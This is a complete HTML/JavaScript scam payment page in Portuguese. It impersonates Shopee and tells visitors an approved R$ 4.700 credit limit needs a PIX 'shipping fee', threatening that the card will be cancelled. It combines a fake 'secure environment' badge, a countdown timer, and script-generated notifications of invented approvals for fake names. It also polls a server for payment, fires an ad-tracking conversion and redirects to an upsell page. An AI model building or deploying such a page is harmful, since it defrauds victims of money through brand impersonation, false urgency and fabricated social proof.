<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <script src="https://cdn.xtracky.com/scripts/utm-handler.js" data-token="7a0b5526-2fea-4e6a-a2f2-7a204a86b83f" data-click-id-param="click_id"></script>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Kwai Header</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
  <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
  <style>
    * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
    body { background-color: #f5f5f5; }
    @keyframes slide-in { 0% { transform: translateY(-20px); opacity: 0; } 100% { transform: translateY(0); opacity: 1; } }
    @keyframes slide-out { 0% { transform: translateY(0); opacity: 1; } 100% { transform: translateY(-20px); opacity: 0; } }
    .animate-slide-in { animation: slide-in 0.4s ease forwards; }
    .animate-slide-out { animation: slide-out 0.4s ease forwards; }
    @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }
    .blinking { animation: blink 1s infinite; }
  </style>
</head>

<body class="flex items-center flex-col">
  <header class="w-full bg-[#FF6420] flex flex-col items-center justify-center rounded-b-xl shadow-md overflow-hidden">
    <img src="https://magilclean.com.br/wp-content/uploads/2022/04/shopee-1.png" alt="Logo Kwai" class="w-full max-w-[300px] object-contain mt-4" />
    <p class="text-white text-sm text-center my-2">Transação rápida, segura e sem complicação</p>
  </header>

  <section class="w-[90%] sm:w-[80%] mt-4 bg-[#004a99] text-white p-5 rounded-md shadow-md">
    <h2 class="text-base sm:text-lg font-bold tracking-wide uppercase text-center mb-4">
      Essa oportunidade é válida apenas hoje! O não pagamento fará que seu cartão seja cancelado
    </h2>
    <div class="text-sm sm:text-base space-y-2">
      <p class="flex items-center gap-2">
        <i class="fas fa-coins text-yellow-300"></i>
        <span><strong>Limite Disponível:</strong> R$ 4.700,00</span>
      </p>
      <p class="flex items-center gap-2">
        <i class="fas fa-file-invoice-dollar text-white"></i>
        <span><strong>Valor da Taxa de ENVIO:</strong> <span id="payment-amount">R$ 0,00</span></span>
      </p>
    </div>
  </section>

  <section class="shadow-sm flex flex-col bg-[#fff] items-center justify-center w-[80%] mt-10 p-5 rounded-md">
    <div class="flex justify-between w-full">
      <div></div>
      <p class="text-white flex items-center gap-1 bg-green-600 w-[150px] rounded-sm p-1 text-sm">
        <i class="fas fa-lock"></i> Ambiente Seguro
      </p>
    </div>

    <h1 class="mt-5 flex items-center gap-1 text-lg text-[#ff6420] font-semibold">
      <i class="fas fa-qrcode"></i> Escaneie o QRCODE abaixo
    </h1>

    <div id="qr-code" style="margin-top: 20px; margin-bottom: 20px;"></div>

    <h2 class="mt-10 text-lg items-center flex gap-1 text-[#ff6420] font-semibold">
      <i class="fas fa-copy"></i> ou copie o código PIX
    </h2>

    <input class="mt-5 border-1 border-gray-300 rounded-lg p-2 w-full text-gray-600 text-sm" type="text" disabled id="pix-code" value="Carregando..." />
    <button id="copy-button" class="mt-5 w-full bg-[#ff6420] p-2 rounded-md text-xs text-white">Copiar</button>

    <div class="w-full mt-10">
      <div class="relative bg-white rounded-lg shadow-sm overflow-hidden">
        <div class="absolute left-0 top-0 bottom-0 w-1.5 bg-[#ff6420] rounded-l"></div>
        <div class="p-4 pl-6">
          <div class="flex justify-between items-center mb-3">
            <span class="text-[#ff6420] font-medium">Valor:</span>
            <span id="payment-amount-2" class="text-gray-900 font-medium">R$ 0,00</span>
          </div>
          <div class="flex justify-between items-center">
            <span class="text-[#ff6420] font-medium">Válido até:</span>
            <span id="valid-until" class="text-gray-900 blinking">--:--</span>
          </div>
        </div>
      </div>
    </div>
  </section>

  <div id="fake-notification" class="fixed top-5 right-5 bg-white border-l-4 border-green-500 rounded-md px-4 py-3 text-sm shadow-lg flex items-center gap-2 z-50 hidden animate-slide-in">
    <i class="fas fa-hand-holding-usd text-green-600"></i>
    <span id="notif-text" class="text-gray-800 font-semibold">Carregando...</span>
  </div>

  <audio id="money-sound" preload="auto">
    <source src="/dinheiro.mp3" type="audio/mpeg">
  </audio>

<script>
  function iniciarTimerPix(minutos = 10) {
    let tempo = minutos * 60;
    const el = document.getElementById("valid-until");
    const atualizar = () => {
      if (!el) return;
      const min = String(Math.floor(tempo / 60)).padStart(2, '0');
      const seg = String(tempo % 60).padStart(2, '0');
      el.textContent = `${min}:${seg}`;
      if (tempo <= 0) {
        clearInterval(intervalo);
        el.textContent = "Expirado";
        el.classList.remove("blinking");
        el.classList.add("text-red-600");
      }
      tempo--;
    };
    atualizar();
    const intervalo = setInterval(atualizar, 1000);
  }
  iniciarTimerPix(10);

  function exibirNotificacaoFake() {
    const nomesFake = ["Lucas", "Amanda", "João", "Fernanda", "Caio", "Juliana", "Pedro", "Lívia", "Rafael", "Camila"];
    const valor = (Math.random() * (5000 - 600) + 600).toFixed(2).replace('.', ',');
    const nome = nomesFake[Math.floor(Math.random() * nomesFake.length)];
    const texto = `${nome} LIMITE APROVADO R$ ${valor} de Shopee`;
    const notif = document.getElementById("fake-notification");
    const span = document.getElementById("notif-text");
    const audio = document.getElementById("money-sound");
    span.textContent = texto;
    notif.classList.remove("hidden", "animate-slide-out");
    notif.classList.add("animate-slide-in");
    audio.volume = 0.3;
    audio.play();
    setTimeout(() => { notif.classList.remove("animate-slide-in"); notif.classList.add("animate-slide-out"); }, 4500);
    setTimeout(() => { notif.classList.add("hidden"); }, 5000);
  }
  setTimeout(() => {
    exibirNotificacaoFake();
    setInterval(() => { exibirNotificacaoFake(); }, Math.floor(Math.random() * (12000 - 8000) + 8000));
  }, 2000);

  document.addEventListener("DOMContentLoaded", function () {
    let pixData = JSON.parse(localStorage.getItem('pixData') || '{}');
    if (pixData && pixData.pix) {
      new QRCode(document.getElementById("qr-code"), { text: pixData.pix, width: 300, height: 300 });
      document.getElementById("pix-code").value = pixData.pix;
      const amount = (pixData.amount / 100).toFixed(2).replace(".", ",");
      document.getElementById("payment-amount").textContent = `R$ ${amount}`;
      document.getElementById("payment-amount-2").textContent = `R$ ${amount}`;
      const expirationDate = new Date(new Date().getTime() + 30 * 60000);
      const formattedDate = expirationDate.toLocaleDateString("pt-BR") + ", " + expirationDate.toLocaleTimeString("pt-BR", { hour: "2-digit", minute: "2-digit" });
      document.getElementById("valid-until").textContent = formattedDate;
      startPaymentStatusCheck(pixData.id);
    }

    document.getElementById("copy-button").addEventListener("click", function () {
      const pixCode = document.getElementById("pix-code");
      navigator.clipboard.writeText(pixCode.value).then(() => {
        this.textContent = "Copiado!";
        setTimeout(() => { this.textContent = "Copiar"; }, 2000);
      });
    });

    function startPaymentStatusCheck(transactionId) {
      let paymentConfirmed = false;
      checkPaymentStatus(transactionId);
      const checkInterval = setInterval(() => {
        if (paymentConfirmed) { clearInterval(checkInterval); return; }
        checkPaymentStatus(transactionId);
      }, 4000);
      setTimeout(() => { clearInterval(checkInterval); }, 1800000);

      function checkPaymentStatus(transactionId) {
        fetch('/verifyPayment.php', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ transactionId })
        })
        .then(response => response.json())
        .then(data => {
          if (['PAID', 'COMPLETED', 'APPROVED', 'paid'].includes(data.status)) {
            paymentConfirmed = true;

            // ✅ Disparo manual do trackConversion da Xtracky
            if (typeof window.trackConversion === 'function') {
              window.trackConversion();
            }

            window.location.href = '/up1' + window.location.search;
          } else if (['CANCELED', 'REJECTED', 'FAILED'].includes(data.status)) {
            alert('Pagamento cancelado');
          }
        })
        .catch(error => console.error('Erro ao verificar status do pagamento:', error));
      }
    }
  });
</script>
</body>
</html>
